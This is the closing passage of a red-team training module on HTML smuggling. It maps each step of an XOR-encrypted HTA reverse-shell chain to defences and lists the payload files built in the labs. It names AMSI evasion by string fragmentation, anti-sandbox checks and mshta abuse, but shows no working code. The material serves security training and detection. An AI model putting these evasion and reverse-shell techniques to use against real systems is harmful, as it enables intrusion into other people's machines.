| **ASR Rules** | Rule D3E037E1 "Block JavaScript/VBScript from launching downloaded executable content" would block this. | ✅ Would block if enabled in Block mode |
| **EDR Behavioral** | Would flag mshta → powershell with hidden window + outbound connection. | ✅ Strong detection |
| **WDAC / AppLocker** | Could block mshta.exe entirely if not needed for business. | ✅ Strongest prevention |
| **Network Monitoring** | Would detect outbound connection to unusual port (4444). | ✅ Would alert |

### 8.5 The Attacker-Defender Balance

```
What the attacker controls:
  ✓ Delivery: HTML smuggling bypasses all perimeter defenses
  ✓ Encryption: XOR hides payload from static analysis
  ✓ Social engineering: Professional page design tricks the user
  ✓ Execution: mshta.exe is signed by Microsoft
  ✓ AMSI evasion: String fragmentation hides malicious patterns
  ✓ Persistence: Reverse shell runs in a hidden PowerShell process

What the defender controls:
  ✓ Sysmon telemetry: Logs every step of the attack chain
  ✓ ASR rules: Can block the mshta → script execution pattern
  ✓ EDR behavioral detection: Flags suspicious process chains
  ✓ WDAC/AppLocker: Can block mshta.exe entirely
  ✓ Network monitoring: Detects C2 callbacks on unusual ports
  ✓ User training: Teach users not to open unexpected .hta files
```

**The key insight:** No single defense stops this entire chain. It takes defense-in-depth (multiple layers working together) to reliably detect and block HTML smuggling attacks. That is exactly why this technique remains effective -- most organizations do not have all layers properly configured.

---

## Summary -- What You Built

| Exercise | What You Did | Technique | Shell? |
|:---------|:-------------|:----------|:-------|
| Part 2 | Smuggled a text file via Blob API | Basic HTML smuggling | No |
| Part 3 | Smuggled a compiled Windows executable | EXE smuggling + build script | No |
| Part 4 | Added XOR encryption to hide the payload | Encrypted smuggling | No |
| Part 5.2-5.4 | Created an HTA → calc.exe proof of concept | HTA smuggling + LOLBin | No |
| Part 5.6 | HTA → PowerShell → whoami recon | Command execution chain | No |
| Part 5.9-5.10 | Built an obfuscated reverse shell HTA | AMSI evasion + reverse shell | **YES** |
| Part 6 | Added anti-sandbox checks (mouse, screen, timing) | Anti-analysis evasion | No |
| Part 7 | Full chain: XOR-encrypted smuggled HTA → reverse shell | **Complete attack simulation** | **YES** |
| Part 8 | Traced every Sysmon event in the attack chain | Detection analysis | — |

### Tools You Now Have on Kali

```
~/labs/
    scripts/
        build_smuggler.sh        -- Basic HTML smuggling page builder
        build_xor_smuggler.sh    -- XOR-encrypted smuggling page builder
        xor_encode.py            -- XOR + Base64 payload encoder
    payloads/
        poc.c / poc.exe          -- Proof-of-concept executable (opens calc)
        update.hta               -- Basic HTA payload (calc POC)
        recon.hta                -- Reconnaissance HTA (whoami, systeminfo)
        revshell.hta             -- Obfuscated reverse shell HTA (direct)
        revshell_staged.hta      -- Staged reverse shell HTA (via exclusion folder)
        shell_final.hta          -- Full chain reverse shell HTA
    html/
        smuggle-text.html        -- Text file smuggling demo
        smuggle-exe.html         -- EXE smuggling demo
        smuggle-xor.html         -- XOR-encrypted EXE smuggling
        smuggle-hta.html         -- HTA smuggling (calc)
        smuggle-recon.html       -- Recon HTA smuggling
        smuggle-advanced.html    -- Anti-analysis demo page
        final_chain.html         -- Complete attack chain (reverse shell)
```

### Key Takeaways

1. **HTML smuggling bypasses perimeter defenses** because no malicious file crosses the network -- the payload is assembled inside the browser
2. **XOR encryption adds a layer** that defeats static content inspection of the HTML source
3. **HTA + mshta.exe provides code execution** via a trusted, Microsoft-signed binary
4. **String fragmentation evades AMSI** by preventing malicious class names from appearing as literals in the script source
5. **Reverse shells use outbound TCP connections** which firewalls rarely block, giving you interactive access to the target
6. **Anti-analysis techniques** (mouse detection, screen checks, delays) help evade automated sandbox analysis
7. **MOTW is still applied** -- smuggling defeats the gateway, not the endpoint. SmartScreen still warns.
8. **Every step is logged in Sysmon** -- understanding the detection trail is what separates a professional red team operator from someone who gets caught on their first engagement

---

**Next module:** [04_lolbins_and_execution_chains.md](04_lolbins_and_execution_chains.md) -- Deep dive into Living-off-the-Land Binaries. You will learn certutil, msbuild, rundll32, and more -- each with hands-on labs and full detection analysis.
